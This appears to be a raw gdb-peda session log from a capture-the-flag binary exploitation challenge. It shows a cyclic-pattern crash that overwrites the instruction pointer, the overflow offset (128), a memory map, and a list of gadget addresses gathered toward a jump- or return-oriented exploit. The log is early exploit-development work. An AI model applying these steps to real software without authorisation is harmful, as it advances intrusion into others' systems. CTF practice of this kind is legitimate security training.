@@ -1,0 +1,66 @@
+gdb-peda$ run
+Starting program: /home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop 
+Your age: 
+1111
+Your name: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
+
+Program received signal SIGSEGV, Segmentation fault.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x400518 --> 0x0 
+RCX: 0x451492 (<read+18>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x41416b41 ('AkAA')
+RSI: 0x4c3300 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAA")
+RDI: 0x457 
+RBP: 0x7fffffffdda0 --> 0x402eb0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fffffffdd78 --> 0x401ec1 (<main+131>:	mov    eax,0x0)
+RIP: 0x41416b41 ('AkAA')
+R8 : 0xb ('\x0b')
+R9 : 0xb ('\x0b')
+R10: 0x49500f ("Your name: ")
+R11: 0x246 
+R12: 0x402f50 (<__libc_csu_fini>:	endbr64)
+R13: 0x0 
+R14: 0x4c0018 --> 0x447440 (<__strcpy_avx2>:	endbr64)
+R15: 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41416b41
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd78 --> 0x401ec1 (<main+131>:	mov    eax,0x0)
+0008| 0x7fffffffdd80 --> 0x7fffffffded8 --> 0x7fffffffe204 ("/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop")
+0016| 0x7fffffffdd88 --> 0x100402f50 
+0024| 0x7fffffffdd90 --> 0x0 
+0032| 0x7fffffffdd98 --> 0x457004c0018 
+0040| 0x7fffffffdda0 --> 0x402eb0 (<__libc_csu_init>:	endbr64)
+0048| 0x7fffffffdda8 --> 0x4026e0 (<__libc_start_main+1168>:	mov    edi,eax)
+0056| 0x7fffffffddb0 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000041416b41 in ?? ()
+gdb-peda$ PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
+Undefined command: "PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA".  Try "help".
+gdb-peda$ patto AkAA
+AkAA found at offset: 128
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop
+0x00401000         0x00495000         r-xp	/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop
+0x00495000         0x004bc000         r--p	/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop
+0x004bd000         0x004c0000         r--p	/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop
+0x004c0000         0x004c3000         rw-p	/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop
+0x004c3000         0x004e7000         rw-p	[heap]
+0x00007ffff7ffa000 0x00007ffff7ffd000 r--p	[vvar]
+0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+
+0x0000000000490788: mov ebp, dword ptr [rbp - 0x18]; mov r14, qword ptr [rbp - 0x10]; mov r15, qword ptr [rbp - 8]; leave; ret; 
+0x0000000000490790: mov edi, dword ptr [rbp - 8]; leave; ret; 
+0x000000000049078c: mov esi, dword ptr [rbp - 0x10]; mov r15, qword ptr [rbp - 8]; leave; ret; 
+0x0000000000490784: mov esp, dword ptr [rbp - 0x20]; mov r13, qword ptr [rbp - 0x18]; mov r14, qword ptr [rbp - 0x10]; mov r15, qword ptr [rbp - 8]; leave; ret; 
+
